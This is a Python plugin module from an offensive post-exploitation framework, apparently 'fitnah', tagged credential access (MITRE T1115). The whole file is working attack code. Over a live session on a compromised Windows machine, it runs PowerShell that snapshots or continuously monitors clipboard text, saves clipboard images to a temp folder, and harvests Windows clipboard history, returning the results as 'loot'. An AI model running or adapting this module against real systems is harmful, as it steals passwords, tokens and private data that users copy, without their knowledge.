"""credential_access/clipboard — capture + monitor clipboard text/image/history. MITRE T1115"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class Clipboard(BasePlugin):
    NAME        = "clipboard"
    DESCRIPTION = "Capture clipboard text/image/history. monitor_sec>0 polls for changes with timestamps."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1115"
    CATEGORY    = "credential_access"
    schema      = ParamSchema().add(
        Param("monitor_sec", int,  required=False, default=0,
              help="Monitor clipboard for N seconds capturing each change (0=single snapshot)"),
        Param("dump_image",  bool, required=False, default=True,
              help="Save clipboard image to TEMP and include path in output"),
    )

    @mitre("T1115")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        monitor_sec = params.get("monitor_sec", 0)
        dump_image  = params.get("dump_image",  True)

        img_block = (
            "try{"
            "  $img=Get-Clipboard -Format Image -EA SilentlyContinue;"
            "  if($img){"
            "    $ip=\"$env:TEMP\\clip_$(Get-Random).png\";"
            "    $img.Save($ip);"
            "    $out+=\"[IMG] $ip ($($img.Width)x$($img.Height))`n\""
            "  }"
            "}catch{};"
        ) if dump_image else ""

        if monitor_sec > 0:
            ps = (
                "$out='';"
                "$prev='';"
                f"$end=(Get-Date).AddSeconds({monitor_sec});"
                "while((Get-Date)-lt $end){"
                "  $cur=(Get-Clipboard -EA SilentlyContinue|Out-String).Trim();"
                "  if($cur -and $cur -ne $prev){"
                "    $out+=\"[$(Get-Date -Format 'HH:mm:ss')] $cur`n\";"
                "    $prev=$cur"
                "  };"
                "  Start-Sleep -Milliseconds 500"
                "};"
                + img_block
                + "if(-not $out){'No clipboard changes detected'}else{$out}"
            )
        else:
            # Single snapshot + history
            ps = (
                "$out=@();"
                "$text=(Get-Clipboard -EA SilentlyContinue|Out-String).Trim();"
                "if($text){$out+='[Text]';$out+=$text}"
                "else{$out+='[Text]: empty'};"
                + img_block
                + "try{"
                "  [Windows.ApplicationModel.DataTransfer.Clipboard,Windows.ApplicationModel,ContentType=WindowsRuntime]|Out-Null;"
                "  $t=[Windows.ApplicationModel.DataTransfer.Clipboard]::GetHistoryItemsAsync();"
                "  $t.AsTask().Wait(3000)|Out-Null;"
                "  if($t.Status -eq 'RanToCompletion'){"
                "    $items=$t.Result.Items;"
                "    $out+=\"[History: $($items.Count) items]\";"
                "    foreach($i in ($items|Select-Object -First 10)){"
                "      if($i.Content.Contains('Text')){"
                "        $tf=$i.Content.GetTextAsync();"
                "        $tf.AsTask().Wait(1000)|Out-Null;"
                "        if($tf.Status -eq 'RanToCompletion'){$out+=\"  $($tf.Result)\"}"
                "      }"
                "    }"
                "  }"
                "}catch{"
                "  $db=Get-ChildItem \"$env:LOCALAPPDATA\\Microsoft\\Windows\\Clipboard\" -Filter *.db -EA SilentlyContinue;"
                "  $out+=if($db){'[History DB]: '+($db.FullName -join ', ')}else{'[History]: not available'}"
                "};"
                "$out -join \"`n\""
            )

        r = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")
        return ModuleResult.ok(data=r["output"], loot_kind="clipboard")
